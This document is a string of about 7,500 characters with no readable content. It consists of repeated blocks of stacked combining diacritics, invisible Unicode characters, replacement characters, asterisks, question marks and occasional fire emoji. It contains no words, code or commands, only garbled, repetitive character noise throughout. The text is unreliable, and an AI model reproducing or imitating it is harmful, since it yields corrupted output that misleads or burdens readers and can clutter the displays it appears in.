̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝